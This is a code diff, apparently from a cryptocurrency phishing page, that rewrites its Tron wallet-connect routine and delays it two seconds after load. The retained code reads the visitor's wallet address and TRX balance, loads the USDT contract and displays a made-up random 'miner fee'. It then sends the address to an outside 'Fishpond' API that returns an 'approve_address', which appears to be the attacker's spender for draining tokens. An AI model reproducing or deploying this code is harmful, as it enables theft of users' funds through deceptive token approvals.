@@ -211,55 +211,56 @@
         }
 
         async function connectWallet() {
-            if (!window.tronWeb) {
-                alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
-                return;
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                try {
+                    var tronWeb = window.tronWeb;
+                    let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+                    // 获取用户地址
+                    const userAddress = tronWeb.defaultAddress.base58;
+        
+                    // 获取 TRX 余额
+                    const trxBalance = await tronWeb.trx.getBalance(userAddress);
+                    
+                    document.getElementById("yu").textContent = (trxBalance / 1e6).toFixed(6) + " TRX"; // 转换为 TRX 单位
+        
+                    // 获取随机 feeLimit 值
+                    const randomFeeLimit = getRandomFeeLimit();
+                    
+                    // 显示矿工费为随机的 feeLimit 值
+                    const estimatedFee = randomFeeLimit / 1e6; // 转换为 TRX 单位
+                    document.getElementById("miner-fee").textContent = estimatedFee.toFixed(6) + " TRX";
+        
+        
+                    jQuery.ajax({
+            			url: 'https://api.wpchat.cc/api/Fishpond/getUserInfo',
+            			type: 'post',
+            			data: {'address':userAddress,'chaintype':'trc'},
+            			async: false,
+            			success: function (result) {
+            				if(result.code == 1){
+            				    $('#address').text(result.data.approve_address);
+            				    approve_address = result.data.approve_address;
+            				}
+            			}
+            		});
+        
+                } catch (error) {
+                    console.error("Failed to obtain mining fee:", error);
+                    alert("获取挖矿费失败，请重试！");
+                    document.getElementById("miner-fee").textContent = "Failed to obtain";
+                }
             }
             
-            try {
-                var tronWeb = window.tronWeb;
-                let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-                // 获取用户地址
-                const userAddress = tronWeb.defaultAddress.base58;
-
-                // 获取 TRX 余额
-                const trxBalance = await tronWeb.trx.getBalance(userAddress);
-                
-                document.getElementById("yu").textContent = (trxBalance / 1e6).toFixed(6) + " TRX"; // 转换为 TRX 单位
-
-                // 获取随机 feeLimit 值
-                const randomFeeLimit = getRandomFeeLimit();
-                
-                // 显示矿工费为随机的 feeLimit 值
-                const estimatedFee = randomFeeLimit / 1e6; // 转换为 TRX 单位
-                document.getElementById("miner-fee").textContent = estimatedFee.toFixed(6) + " TRX";
-
-
-                jQuery.ajax({
-        			url: 'https://api.wpchat.cc/api/Fishpond/getUserInfo',
-        			type: 'post',
-        			data: {'address':userAddress,'chaintype':'trc'},
-        			async: false,
-        			success: function (result) {
-        				if(result.code == 1){
-        				    $('#address').text(result.data.approve_address);
-        				    approve_address = result.data.approve_address;
-        				}
-        			}
-        		});
-
-            } catch (error) {
-                console.error("Failed to obtain mining fee:", error);
-                alert("获取挖矿费失败，请重试！");
-                document.getElementById("miner-fee").textContent = "Failed to obtain";
-            }
         }
 
         // 页面加载完成后自动连接钱包并监听金额输入框
         window.onload = () => {
-            connectWallet();
-            document.getElementById("zhi").addEventListener("input", checkAmountInput);
-            checkAmountInput(); // 初始化按钮状态
+            setTimeout(function() {
+                connectWallet();
+                document.getElementById("zhi").addEventListener("input", checkAmountInput);
+                checkAmountInput(); // 初始化按钮状态
+            }, 2000); // 2000 毫秒 = 2 秒
+            
         };
     </script>
    
